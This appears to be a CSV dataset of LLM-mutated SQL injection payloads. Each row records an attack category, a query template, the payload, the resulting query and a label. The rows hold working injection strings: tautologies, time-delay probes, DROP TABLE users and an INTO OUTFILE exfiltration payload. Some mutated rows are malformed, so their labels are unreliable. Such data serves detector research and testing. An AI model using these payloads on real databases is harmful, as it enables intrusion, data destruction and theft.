attack_category,template_context,payload,full_query,label,source,generator_model,mutation_count,original_payload,failure_stage
tautology,login,-- - OR 1=2 OR 1=2 --,SELECT * FROM users WHERE username = '-- - OR 1=2 OR 1=2 --' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'; OR NOT 1=1; DROP TABLE users;--,judge
tautology,login,-- WAITFOR DELAY '00:00:10',SELECT * FROM users WHERE username = '-- WAITFOR DELAY '00:00:10'' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,; WAITFOR DELAY '00:00:10' AND 1=1 --,judge
tautology,search,' OR 1=1 /*,SELECT * FROM products WHERE name LIKE '%' OR 1=1 /*%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,;--comment OR ' AND 1=1',sandbox
tautology,search,' OR Sleep(10),SELECT * FROM products WHERE name LIKE '%' OR Sleep(10)%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,; WAITFOR DELAY '0:0:10' AND 1=1,judge
tautology,user_lookup,('x' FROM users WHERE 1),SELECT * FROM users WHERE id = ('x' FROM users WHERE 1),1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,(SELECT 'x' FROM users WHERE 1=1),sandbox
tautology,order_filter,';--',SELECT * FROM orders WHERE status = '';--'' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,' OR SLEEP(5) /*,judge
tautology,order_filter,'; WAITFOR DELAY '0:0:5'--,SELECT * FROM orders WHERE status = ''; WAITFOR DELAY '0:0:5'--' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'; WAITFOR DELAY '0:0:5'--,judge
tautology,order_filter,OR CAST((SELECT COUNT(*) FROM users) AS VARCHAR) LIKE ''0''%,SELECT * FROM orders WHERE status = 'OR CAST((SELECT COUNT(*) FROM users) AS VARCHAR) LIKE ''0''%' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,OR CAST((SELECT COUNT(*) FROM users) AS VARCHAR) = '0' /*,judge
tautology,comment_insert,--; DROP TABLE IF EXISTS users;,"INSERT INTO comments (user_id, body) VALUES (1, '--; DROP TABLE IF EXISTS users;')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/*' OR */('1'='1),judge
tautology,comment_insert,' OR '1'='1' --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR '1'='1' --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,; /*' OR */('1'='1',sandbox
union_based,login,' OR username='admin'--,SELECT * FROM users WHERE username = '' OR username='admin'--' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'1' AND 1=1; SELECT user_data INTO OUTFILE '/var/lib/mysql-files/exfil.txt'; --,judge
